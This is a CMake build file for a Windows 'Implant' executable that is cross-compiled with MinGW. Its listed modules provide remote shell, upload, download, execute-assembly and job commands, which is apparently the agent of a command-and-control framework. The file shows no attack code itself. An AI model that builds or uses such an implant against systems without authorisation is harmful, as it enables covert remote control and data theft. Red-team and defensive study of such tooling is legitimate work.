cmake_minimum_required(VERSION 3.14)

project(Implant)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_COMPILER /usr/bin/x86_64-w64-mingw32-g++)

include_directories(
    include
    external/json/include
)

add_executable(Implant
    src/Main.cpp
    src/Implant.cpp
    src/Channel/Channel.cpp
    src/Command/Command.cpp
    src/Command/CommandChannel.cpp
    src/Command/CommandExit.cpp
    src/Command/CommandPs.cpp
    src/Command/CommandCd.cpp
    src/Command/CommandCp.cpp
    src/Command/CommandShell.cpp
    src/Command/CommandDownload.cpp
    src/Command/CommandUpload.cpp
    src/Command/CommandRun.cpp
    src/Command/CommandExecuteAssembly.cpp
    src/Command/CommandJob.cpp
)

target_link_options(Implant PRIVATE 
    "-Wl,--gc-sections"
    "-s"                 
    "-static"            
    "-static-libgcc"     
    "-static-libstdc++"  
)

set(DEFAULT_CHANNEL "{0x0}" CACHE STRING "default channel")

target_compile_definitions(Implant PRIVATE "DEFAULT_CHANNEL=${DEFAULT_CHANNEL}")

target_link_libraries(Implant PRIVATE
    ntdll
    crypt32
    secur32
)